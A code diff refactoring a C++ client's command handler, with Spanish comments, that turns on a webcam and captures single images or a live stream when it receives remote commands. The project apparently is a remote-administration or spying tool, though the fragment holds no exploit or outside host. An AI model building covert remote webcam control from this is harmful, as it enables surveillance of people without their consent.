@@ -374,28 +374,30 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
 
-        HRESULT hr;
+        HRESULT hr = S_OK;
         u_int iDeviceIndex = atoi(strIn[1].c_str());
         
         if (!this->mod_Cam) {
             this->mod_Cam = new mod_Camera();
-            if (iDeviceIndex > this->mod_Cam->vcCams.size()) {
+            if (iDeviceIndex > int(this->mod_Cam->vcCamObjs.size())) {
                 //index seleccionado es mas grande que el numero de dispositivos, 
                 // 0 - default
                 iDeviceIndex = 0;
             }
         }
 
-        if (!this->mod_Cam->vcActivated[iDeviceIndex]) {
-            hr = this->mod_Cam->Init(this->mod_Cam->vcCams[iDeviceIndex], iDeviceIndex);
+        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated) {
+            hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);
         }
         
         if (SUCCEEDED(hr)) {
-            this->mod_Cam->vcActivated[iDeviceIndex] = true;
+            this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;
 
             DebugPrint("[!] Camara iniciada correctamente");
 
             std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
+            strHeader.append(1, CMD_DEL);
+            strHeader += strIn[1];
             strHeader.append(1, CMD_DEL);
 
             //Testing
@@ -438,7 +440,9 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Start) {
         u_int iDeviceIndex = atoi(strIn[1].c_str());
-        this->mod_Cam->SpawnLive(iDeviceIndex);
+        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
+            this->mod_Cam->SpawnLive(iDeviceIndex);
+        }
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Stop) {
